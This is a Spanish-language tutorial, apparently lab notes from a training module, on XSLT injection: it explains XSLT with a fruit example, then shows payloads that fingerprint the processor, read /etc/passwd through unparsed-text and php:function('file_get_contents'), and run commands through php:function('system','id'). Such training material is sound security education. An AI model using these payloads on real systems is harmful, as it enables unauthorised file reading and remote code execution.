![Pasted image 20260207203451](/assets/img/posts/server-side-attacks/Pasted%20image%2020260207203451.png)

## XSLT Injection

El lenguaje extensible de transformación de hojas de estilo ([XSLT](https://www.w3.org/TR/xslt-30/)) es un lenguaje que permite la transformación de documentos XML. Por ejemplo, puede seleccionar nodos específicos de un documento XML y cambiar la estructura XML.

### eXtensible Stylesheet Language Transformation (XSLT)

Como su nombre indica, la inyección XSLT se produce cada vez que se inserta información introducida por el usuario en los datos XSL antes de que el procesador XSLT genere la salida. Esto permite a un atacante inyectar elementos XSL adicionales en los datos XSL, que el procesador XSLT ejecutará durante el proceso de generación de la salida.

Dado que XSLT opera con datos basados en XML, analizaremos el siguiente documento XML de ejemplo para explorar cómo funciona XSLT:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<fruits>
    <fruit>
        <name>Apple</name>
        <color>Red</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Banana</name>
        <color>Yellow</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Strawberry</name>
        <color>Red</color>
        <size>Small</size>
    </fruit>
</fruits>
```

XSLT se puede utilizar para definir un formato de datos que posteriormente se enriquece con datos del documento XML. Los datos XSLT tienen una estructura similar a la de XML. Sin embargo, contienen elementos XSL dentro de nodos con el prefijo xsl. 

- **<xsl:template>**: este elemento indica una plantilla XSL. Puede contener un atributo match que contiene una ruta en el documento XML al que se aplica la plantilla.

- **<xsl:value-of>**: este elemento extrae el valor del nodo XML especificado en el atributo select.

- **<xsl:for-each>**: este elemento permite recorrer todos los nodos XML especificados en el atributo select.

Por ejemplo, un documento XSLT sencillo utilizado para mostrar todas las frutas contenidas en el documento XML, así como su color, podría tener el siguiente aspecto:

```xslt
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all the fruits:
		<xsl:for-each select="fruit">
			<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>
```

Como podemos ver, el documento XSLT contiene un único elemento XSL <xsl:template> que se aplica al nodo `<fruits>` del documento XML. La plantilla consta de la cadena estática «Here are all the fruits:» y un bucle sobre todos los nodos `<fruit>` del documento XML. Para cada uno de estos nodos, los valores de los nodos `<name>` y `<color>` se imprimen utilizando el elemento XSL `<xsl:value-of>`. Al combinar el documento XML de ejemplo con los datos XSLT anteriores, se obtiene el siguiente resultado:

```txt
Here are all the fruits:
    Apple (Red)
    Banana (Yellow)
    Strawberry (Red)
```

Algunos elementos XSL adicionales que se pueden utilizar para restringir aún más o personalizar los datos de un documento XML:

- `<xsl:sort>`: este elemento especifica cómo ordenar los elementos en un bucle «for» en el argumento «select». Además, se puede especificar un orden de clasificación en el argumento «order».

- `<xsl:if>`: este elemento se puede utilizar para comprobar las condiciones de un nodo. La condición se especifica en el argumento «test».

Por ejemplo, podemos utilizar estos elementos XSL para crear una lista de todas las frutas que son de tamaño mediano, ordenadas por su color en orden descendente:

```xslt
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/fruits">
		Here are all fruits of medium size ordered by their color:
		<xsl:for-each select="fruit">
			<xsl:sort select="color" order="descending" />
			<xsl:if test="size = 'Medium'">
				<xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
			</xsl:if>
		</xsl:for-each>
	</xsl:template>
</xsl:stylesheet>
```

```txt
Here are all fruits of medium size ordered by their color:
	Banana (Yellow)
	Apple (Red)
```

XSLT se puede utilizar para generar cadenas de salida arbitrarias. Por ejemplo, las aplicaciones web pueden utilizarlo para incrustar datos de documentos XML en una respuesta HTML.

### Identificar XSLT Injection

La aplicación web de muestra muestra información básica sobre algunos módulos de la Academia.

En la parte inferior de la página, podemos proporcionar un nombre de usuario que se inserta en el encabezado en la parte superior de la lista:

![Pasted image 20260207210605](/assets/img/posts/server-side-attacks/Pasted%20image%2020260207210605.png)

Como podemos ver, el nombre que proporcionamos se refleja en la página. Supongamos que la aplicación web almacena la información del módulo en un documento XML y muestra los datos mediante el procesamiento XSLT. En ese caso, podría ser vulnerable a la inyección XSLT si nuestro nombre se inserta sin desinfección antes del procesamiento XSLT. Para confirmarlo, intentemos inyectar una etiqueta XML dañada para provocar un error en la aplicación web. Podemos lograrlo proporcionando el nombre de usuario `<`:

![Pasted image 20260207210722](/assets/img/posts/server-side-attacks/Pasted%20image%2020260207210722.png)

La aplicación web responde con un error del servidor. Aunque esto no confirma de forma definitiva la presencia de una vulnerabilidad de inyección XSLT, puede indicar la existencia de un problema de seguridad.

#### Information Disclosure

Podemos intentar deducir cierta información básica sobre el procesador XSLT que se está utilizando inyectando los siguientes elementos XSLT:

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

![Pasted image 20260207210836](/assets/img/posts/server-side-attacks/Pasted%20image%2020260207210836.png)

Dado que la aplicación web interpretó los elementos XSLT que proporcionamos, esto confirma una vulnerabilidad de inyección XSLT. Además, podemos deducir que la aplicación web parece basarse en la biblioteca libxslt y es compatible con la versión 1.0 de XSLT.

#### Local File Inclusion (LFI)

Podemos intentar utilizar varias funciones diferentes para leer un archivo local. El funcionamiento depende de la versión de XSLT y de la configuración de la biblioteca XSLT. Por ejemplo, XSLT contiene una función unparsed-text que se puede utilizar para leer un archivo local:

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

Sin embargo, solo se introdujo en la versión 2.0 de XSLT. Por lo tanto, nuestra aplicación web no admite esta función y, en su lugar, devuelve un error. No obstante, si la biblioteca XSLT está configurada para admitir funciones PHP, podemos llamar a la función PHP file_get_contents utilizando el siguiente elemento XSLT:

```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

![Pasted image 20260207211830](/assets/img/posts/server-side-attacks/Pasted%20image%2020260207211830.png)

#### Remote Code Execution (RCE)

Si un procesador XSLT admite funciones PHP, podemos llamar a una función PHP que ejecute un comando del sistema local para obtener RCE. Por ejemplo, podemos llamar a la función PHP system para ejecutar un comando:

```xml
<xsl:value-of select="php:function('system','id')" />
```

![Pasted image 20260207211917](/assets/img/posts/server-side-attacks/Pasted%20image%2020260207211917.png)

